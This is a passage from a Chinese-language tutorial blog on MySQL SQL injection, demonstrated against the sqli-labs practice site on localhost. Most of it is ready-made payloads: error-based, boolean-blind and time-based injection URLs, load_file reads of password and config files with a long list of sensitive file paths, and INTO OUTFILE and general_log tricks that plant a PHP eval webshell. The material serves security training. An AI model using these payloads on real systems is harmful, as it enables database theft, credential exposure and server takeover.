USER())a));--其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函 数内，得到的结果将超过mysql的double数组范围，从而报错输出。除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。--double 数值类型超出范围--Exp()为以e 为底的对数函数；--ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'如果是在适用版本之外：虽然也会报错，但是表名不会出来select !(select * from(select user())a)-~0;</code></pre><p><strong>exp、cot、pow、abs等可以报错</strong></p><pre class="language-none"><code class="language-none">select abs(99999e9999999); #可使用在报错的布尔盲注中ERROR 1367 (22007): Illegal double '99999e9999999' value found during parsingselect pow(1+(1=1),999999999999);mysql&gt; select pow(1+(1=1),999999999999);ERROR 1690 (22003): DOUBLE value is out of range in 'pow((1 + (1 = 1)),999999999999)'mysql&gt; select pow(1+(1=0),999999999999);+---------------------------+| pow(1+(1=0),999999999999) |+---------------------------+|                         1 |+---------------------------+1 row in set (0.00 sec)通过这种写法，可以实现报错注入select pow(1+(表达式),999999999999)表达式可以是盲注的形式，返回1或者0，通过报错将字符才出来其他函数用法类似exp临界值709exp(709+(1=0))</code></pre><p>可以参考exp 报错文章：<a href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p><pre class="language-none"><code class="language-none">select !(select * from (select user())x) -（ps:这是减号） ~0--bigint 超出范围；~0 是对0 逐位取反，很大的版本在5.5.5 及其以上</code></pre><p>可以参考文章bigint 溢出文章<a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p><pre class="language-none"><code class="language-none">extractvalue(1,concat(0x7e,(select @@version),0x7e)) --mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误</code></pre><pre class="language-none"><code class="language-none">updatexml(1,concat(0x7e,(select @@version),0x7e),1) --mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误</code></pre><pre class="language-none"><code class="language-none">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;--mysql 重复特性，此处重复了version，所以报错。</code></pre><p><strong>join using()注列名</strong></p><p>通过系统关键词join可建立两个表之间的内连接。</p><p>通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。</p><p>并且报错信息会存在重复的列名，可以使用USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p><pre class="language-none"><code class="language-none">mysql&gt;select * from(select * from users a join (select * from users)b)c;mysql&gt;select * from(select * from users a join (select * from users)b using(username))c;mysql&gt;select * from(select * from users a join (select * from users)busing(username,password))c</code></pre><p><strong>GTID相关函数</strong></p><p>从MySQL 5.6.5 开始新增了一种基于GTID 的复制方式。通过GTID 保证了每个在主库上提交的事务在集群中有一个唯一的ID。这种方式强化了数据库的主备一致性，故障恢复以及容错能力。</p><p>GTID (Global Transaction ID)是全局事务ID,当在主库上提交事务或者被从库应用时，可以定位和追踪每一个事务，对DBA来说意义就很大了，我们可以适当的解放出来，不用手工去可以找偏移量的值了，而是通过CHANGE MASTER TO MASTER_HOST=’xxx’, MASTER_AUTO_POSITION=1的即可方便的搭建从库，在故障修复中也可以采用MASTER_AUTO_POSITION=‘X’的方式。</p><p>可能大多数人第一次听到GTID的时候会感觉有些突兀，但是从架构设计的角度，GTID是一种很好的分布式ID实践方式，通常来说，分布式ID有两个基本要求： 1）全局唯一性 2）趋势递增 这个ID因为是全局唯一，所以在分布式环境中很容易识别，因为趋势递增，所以ID是具有相应的趋势规律，在必要的时候方便进行顺序提取，行业内适用较多的是基于Twitter的ID生成算法snowflake,所以换一个角度来理解GTID，其实是一种优雅的分布式设计。</p><pre class="language-none"><code class="language-none">mysql&gt;select gtid_subset(user(),1);mysql&gt;select gtid_subset(hex(substr((select * from users limit1,1),1,1)),1);mysql&gt;select gtid_subtract((select * from(select user())a),1);</code></pre><p><strong>报错函数速查表</strong></p><p><strong>sqli-labs/less-5</strong></p><p><strong>一：盲注</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql">（<span class="token number">1</span>）利用<span class="token keyword">left</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>进行尝试http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),3)=5.7--+</span>    接下来看一下数据库的长度http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+</span>    猜测数据库第一位http:<span class="token comment">//127.0.0.1/sqllib/Less-5/?id=1'and left(database(),1)&gt;'a'--+</span>    用此方法推测出其他几位（<span class="token number">2</span>）利用substr<span class="token punctuation">(</span><span class="token punctuation">)</span> ascii<span class="token punctuation">(</span><span class="token punctuation">)</span>函数进行尝试<span class="token operator">/</span><span class="token keyword">left</span>也可以，都行http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;65 --+</span>    用此方法推测出其他几位，得到第一个表名    接下来用<span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span>得到第二个表名，以此类推（<span class="token number">3</span>）利用<span class="token operator">regexp</span> 获取表中的列http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+</span>    用此方法推测出其他几位，得到列名（<span class="token number">4</span>）利用ord<span class="token punctuation">(</span><span class="token punctuation">)</span>和<span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数获取users 表的内容http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and ord(mid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+</span>    解释：    IFNULL<span class="token punctuation">(</span>v1<span class="token punctuation">,</span>v2<span class="token punctuation">)</span>:如果 v1 的值不为 <span class="token boolean">NULL</span>，则返回 v1，否则返回 v2。    CAST<span class="token punctuation">(</span>x <span class="token keyword">AS</span> <span class="token keyword">type</span><span class="token punctuation">)</span>：转换数据类型    <span class="token keyword">SELECT</span> IFNULL<span class="token punctuation">(</span>CAST<span class="token punctuation">(</span>username <span class="token keyword">AS</span> <span class="token keyword">CHAR</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token keyword">FROM</span> security<span class="token punctuation">.</span>users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> id <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>    所以这句就是先从表users将username字段取出通过<span class="token keyword">order</span> <span class="token keyword">by</span>进行升序，取出第一行的数据，再cast将其转化为字    符类型，在通过IFNULL判断其里面的数据是否为空，不为空则返回其数据。以上（<span class="token number">1</span>）（<span class="token number">2</span>）（<span class="token number">3</span>）（<span class="token number">4</span>）我们通过使用不同的语句，通过布尔盲注<span class="token keyword">SQL</span>把所有的payload 进行演示了一次。想必通过实例更能够对<span class="token keyword">sql</span> 布尔盲注语句熟悉和理解了</code></pre><p><strong>二：报错注入</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql">（<span class="token number">1</span>）首先使用报错注入，利用count、floor、<span class="token keyword">group</span> <span class="token keyword">by</span>进行报错http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a--+</span>（<span class="token number">2</span>）利用<span class="token keyword">double</span> 数值类型超出范围进行报错注入http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=-1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+</span>（<span class="token number">3</span>）利用<span class="token keyword">bigint</span> 溢出进行报错注入<span class="token punctuation">.</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+</span>（<span class="token number">4</span>）xpath 函数报错注入http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+</span>（<span class="token number">5</span>）updatexml 函数报错注入http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+</span>（<span class="token number">6</span>）利用数据的重复性http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1'union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</span></code></pre><p><strong>updatexml()函数</strong></p><ul><li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li><li>作用：改变文档中符合条件的节点的值</li><li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li><li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li><li>适用版本: 5.1.5+</li></ul><pre class="language-none"><code class="language-none">select updatexml(1,concat(0x7e,(select user()),0x7e),1)ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'</code></pre><p><strong>extractvalue()函数</strong></p><ul><li>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li><li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</li><li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li></ul><pre class="language-none"><code class="language-none">select extractvalue(1,concat(0x7e,(select user()),0x7e))ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'</code></pre><p><strong>三：延时注入</strong></p><pre class="language-none"><code class="language-none">（1）利用sleep()函数进行注入，当错误的时候会有5 秒的时间延时。http://127.0.0.1/sqli-labs/Less-5/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+（2）利用BENCHMARK()进行延时注入http://127.0.0.1/sqli-labs/Less-5/?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+当结果正确的时候，运行ENCODE('MSG','by 5 seconds')操作50000000 次，会占用一段时间。</code></pre><p>sqli-labs/Less-9的payload</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--猜测数据库：</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span><span class="token comment">--说明第一位是s （ascii 码是115）</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),2,1))=101,1,sleep(5))--+</span>说明第一位是e （ascii 码是<span class="token number">101</span>）<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>以此类推，我们知道了数据库名字是security猜测security 的数据表：http:<span class="token comment">//127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+</span>猜测第一个数据表的第一位是e<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>依次类推，得到emailshttp:<span class="token comment">//127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))--+</span>猜测第二个数据表的第一位是r<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>依次类推，得到referers<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>再以此类推，我们可以得到所有的数据表emails<span class="token punctuation">,</span>referers<span class="token punctuation">,</span>uagents<span class="token punctuation">,</span>users猜测users 表的列：http:<span class="token comment">//127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+</span>猜测users 表的第一个列的第一个字符是i，以此类推，我们得到列名是id，username，password猜测username 的值：http:<span class="token comment">//127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+</span>猜测username 的第一行的第一位以此类推，我们得到数据库username，password 的所有内容以上的过程就是我们利用sleep<span class="token punctuation">(</span><span class="token punctuation">)</span>函数注入的整个过程，当然了可以离开BENCHMARK<span class="token punctuation">(</span><span class="token punctuation">)</span>函数进行注入</code></pre><h2 id="导入导出相关操作的讲解"><a href="#导入导出相关操作的讲解" class="headerlink" title="导入导出相关操作的讲解"></a>导入导出相关操作的讲解</h2><p>在了解导入导出相关操作时，先了解以下<code>Mysql</code>变量</p><h3 id="mysql变量"><a href="#mysql变量" class="headerlink" title="mysql变量"></a>mysql变量</h3><p>mysqld服务器维护两种变量。全局变量影响服务器的全局操作。会话变量影响具体客户端连接相关操作。</p><p>服务器启动时，将所有全局变量初始化为默认值。可以在选项文件或命令行中指定的选项来更改这些默认值。服务器启动后，通过连接服务器并执行<code>SET GLOBAL var_name</code>语句可以更改动态全局变量。要想更改全局变量，必须具有SUPER权限。</p><p>服务器还为每个客户端连接维护会话变量。连接时使用相应全局变量的当前值对客户端会话变量进行初始化。客户可以通过<code>SET SESSION var_name</code>语句来更改动态会话变量。设置会话变量不需要特殊权限，但客户可以只更改自己的会话变量，而不更改其它客户的会话变量。</p><p>可以通过<code>SHOW VARIABLES</code>语句查看系统变量及其值。</p><pre class="language-none"><code class="language-none">mysql&gt; SHOW VARIABLES;</code></pre><p>可以使用like语句来匹配和筛选。</p><p><strong>secure_file_priv</strong></p><blockquote><p><code>secure_file_priv</code>对读写文件有影响。 <code>secure-file-priv</code>参数是用来限制<code>LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()</code>传到哪个指定目录的。 当<code>secure_file_priv</code>的值为<code>null</code> ，表示限制<code>mysqld</code> 不允许导入|导出。默认是<code>null</code> 当<code>secure_file_priv</code>的值为<code>/tmp/</code> ，表示限制<code>mysqld</code> 的导入|导出只能发生在<code>/tmp/</code>目录 下 当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>mysqld</code> 的导入|导出做限制</p></blockquote><h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p><blockquote><p><strong>使用条件：</strong> A、必须有权限读取并且文件必须完全可读</p><p>and (select count() from mysql.user)&gt;0 /* 如果结果返回正常,说明具有读写权限。</p><p>and (select count() from mysql.user)&gt;0 /* 返回错误，应该是管理员给数据库帐户降权</p><p>B、欲读取文件必须在服务器上</p><p>C、必须指定文件完整的路径</p><p>D、欲读取文件必须小于max_allowed_packet 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在windows 下，如果NTFS 设置得当，是不能读取相关的文件的，当遇到只有administrators 才能访问的文件，users 就别想load_file 出来。</p><p>在实际的注入中，我们有两个难点需要解决：</p><p>绝对物理路径 构造有效的畸形语句（报错爆出绝对路径）</p><p>在很多PHP 程序中，当提交一个错误的Query，如果display_errors = on，程序就会暴露WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP 程序来说，整个服务器的安全将受到严重的威胁。</p></blockquote><h3 id="WINDOWS下"><a href="#WINDOWS下" class="headerlink" title="WINDOWS下:"></a>WINDOWS下:</h3><blockquote><p>c:/boot.ini //查看系统版本</p><p>c:/windows/php.ini //php配置信息</p><p>c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</p><p>c:/winnt/php.ini</p><p>c:/winnt/my.ini</p><p>c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</p><p>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</p><p>c:\Program Files\Serv-U\ServUDaemon.ini</p><p>c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</p><p>c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</p><p>c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</p><p>c:\Program Files\RhinoSoft.com\ServUDaemon.exe</p><p>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere*.cif文件</p><p>//存储了pcAnywhere的登陆密码</p><p>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件</p><p>c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.</p><p>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</p><p>d:\APACHE\Apache2\conf\httpd.conf</p><p>C:\Program Files\mysql\my.ini</p><p>C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</p></blockquote><h3 id="LUNIX-UNIX-下"><a href="#LUNIX-UNIX-下" class="headerlink" title="LUNIX/UNIX 下:"></a>LUNIX/UNIX 下:</h3><blockquote><p>/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</p><p>/usr/local/apache2/conf/httpd.conf</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p><p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p><p>/etc/sysconfig/iptables //从中得到防火墙规则策略</p><p>/etc/httpd/conf/httpd.conf // apache配置文件</p><p>/etc/rsyncd.conf //同步程序配置文件</p><p>/etc/my.cnf //mysql的配置文件</p><p>/etc/redhat-release //系统版本</p><p>/etc/issue</p><p>/etc/issue.net</p><p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p><p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf //查看linux APACHE虚拟主机配置文件</p><p>/usr/local/resin-3.0.22/conf/resin.conf //针对3.0.22的RESIN配置文件查看</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf //同上</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p><p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</p><p>/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p><p>/etc/sysconfig/iptables 查看防火墙策略</p><p>load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录</p><p>replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</p><p>replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p></blockquote><p><strong>示例：</strong></p><pre class="language-none"><code class="language-none">Select load_file(‘/flag’);SELECT CONVERT(LOAD_FILE("/etc/passwd") USING utf8);</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>利用hex<span class="token punctuation">(</span><span class="token punctuation">)</span>将文件内容导出来，尤其是smb文件时可以使用。<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">Explain</span>：“<span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">)</span>”就是“c:<span class="token operator">/</span>boot<span class="token punctuation">.</span>ini”的ASCII 代码<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token number">0x633a2f626f6f742e696e69</span><span class="token punctuation">)</span><span class="token keyword">Explain</span>：“c:<span class="token operator">/</span>boot<span class="token punctuation">.</span>ini”的<span class="token number">16</span> 进制是“<span class="token number">0x633a2f626f6f742e696e69</span>”<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span>c:\\boot<span class="token punctuation">.</span>ini<span class="token punctuation">)</span><span class="token keyword">Explain</span>:路径里的<span class="token operator">/</span>用\\代替</code></pre><h3 id="文件导入到数据库-LOAD-DATA-INFILE"><a href="#文件导入到数据库-LOAD-DATA-INFILE" class="headerlink" title="文件导入到数据库(LOAD DATA INFILE)"></a>文件导入到数据库(LOAD DATA INFILE)</h3><p>LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p><p>在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile 导入到数据库中。</p><p><strong>示例：</strong></p><pre class="language-none"><code class="language-none">load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t' lines terminated by '\n'</code></pre><p>将/tmp/t0.txt 导入到t0 表中，character set gbk 是字符集设置为gbk，fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符。</p><p>当错误代码是2 的时候的时候，文件不存在，错误代码为13 的时候是没有权限，可以考虑/tmp 等文件夹。 TIPS：我们从mysql5.7 的文档看到添加了load xml 函数，是否依旧能够用来做注入还需要验证。</p><h3 id="导入到文件-OUTFILE"><a href="#导入到文件-OUTFILE" class="headerlink" title="导入到文件(OUTFILE)"></a>导入到文件(OUTFILE)</h3><p>SELECT…..INTO OUTFILE ‘file_name’</p><p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name 不能是一个已经存在的文件。</p><blockquote><p>mysql中的配置文件secure_file_priv变量如果为NULL，则不能导入</p><p>[mysqld] secure_file_priv=”/“</p></blockquote><p>我们一般有两种利用形式： <strong>第一种直接将select 内容导入到文件中：</strong></p><pre class="language-none"><code class="language-none">Select version() into outfile “c:\\phpnow\\htdocs\\test.php”</code></pre><p>此处将<code>version()</code>替换成一句话，<code>\&lt;?php @eval($_post[“mima”])?&gt;</code></p><p>也即 <code>Select\&lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php”</code> 直接连接一句话就可以了，其实在select 内容中不仅仅是可以上传一句话的，也可以上传很多的内容。</p><p><strong>第二种修改文件结尾：</strong></p><pre class="language-none"><code class="language-none">Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16 进制文件</code></pre><p>解释：通常是用<code>‘\r\n’</code>结尾，此处我们修改为自己想要的任何文件。同时可以用<code>FIELDS TERMINATED BY 16</code> 进制可以为一句话或者其他任何的代码，可自行构造。在<code>sqlmap</code> 中<code>os-shell</code> 采取的就是 这样的方式，具体可参考<code>os-shell</code> 分析文章：<a href="http://www.cnblogs.com/lcamry/p/5505110.html">http://www.cnblogs.com/lcamry/p/5505110.html</a> TIPS： （1）可能在文件路径当中要注意转义，这个要看具体的环境 （2）上述我们提到了<code>load_file()</code>,但是当前台无法导出数据的时候，我们可以利用下面的语句：</p><pre class="language-none"><code class="language-none">select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’) into outfile‘c:\\wamp\\www\\test.php’</code></pre><p>可以利用该语句将服务器当中的内容导入到web 服务器下的目录，这样就可以得到数据了。上述my.ini 当中存在password 项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。</p><p>类似的还有一个<code>dumpfile</code></p><pre class="language-none"><code class="language-none">select "&lt;?php phpinfo();?&gt;" into dumpfile "/tmp/1.php";outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</code></pre><p>当<code>secure_file_priv</code>为<code>NULL</code>时</p><pre class="language-sql" data-language="sql"><code class="language-sql">如果存在堆叠注入，当然由于是<span class="token keyword">global</span>变量，需要root权限<span class="token keyword">set</span> <span class="token keyword">global</span> general_log<span class="token operator">=</span><span class="token keyword">on</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">'C:/phpStudy/WWW/789.php'</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">'&lt;?php eval($_POST['</span>a<span class="token string">']) ?&gt;'</span><span class="token punctuation">;</span></code></pre><p><strong>sqli-labs/Less-7</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--使用')) or 1=1--+进行注入</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-7/?id=1')) or 1=1 --+</span>（<span class="token number">2</span>）利用上述提到的文件导入的方式进行演示：http:<span class="token comment">//127.0.0.1/sqli-labs/Less-7/?id=-1')) union select 1,2,3 into outfile "D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.txt"--+</span>（<span class="token number">3</span>）直接将一句话木马导入进去，再用菜刀等webshell 管理工具连接即可http:<span class="token comment">//127.0.0.1/sqli-labs/Less-7/?id=-1'))UNION SELECT 1,2,'&lt;?php @eval($_post[“mima”])?&gt;' into outfile "D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.php"--+</span>（<span class="token number">4</span>）这里也可以到处数据库的内容</code></pre><h2 id="增删改函数介绍"><a href="#增删改函数介绍" class="headerlink" title="增删改函数介绍"></a>增删改函数介绍</h2><p>在对数据进行处理上，我们经常用到的是增删查改。接下来我们讲解一下mysql 的增删改。查就是我们上述总用到的select，这里就介绍了。</p><p>增加一行数据。</p><p><strong>Insert</strong></p><p><strong>删除</strong></p><blockquote><p>删除数据: delete from 表名; delete from 表名where id=1; 删除结构： 删数据库：drop database 数据库名; 删除表：drop table 表名; 删除表中的列:alter table 表名drop column 列名;</p><p><strong>修改</strong> 修改所有：updata 表名set 列名=’新的值，非数字加单引号’ ; 带条件的修改：updata 表名set 列名=’新的值，非数字加单引号’ where id=6;</p></blockquote><h2 id="HTTP-头部介绍"><a href="#HTTP-头部介绍" class="headerlink" title="HTTP 头部介绍"></a>HTTP 头部介绍</h2><p>在利用抓包工具进行抓包的时候，我们能看到很多的项，下面详细讲解每一项。 HTTP 头部详解 1、Accept：告诉WEB 服务器自己接受什么介质类型，*/* 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。 2、Accept-Charset： 浏览器申明自己接收的字符集</p><p>Accept-Encoding： 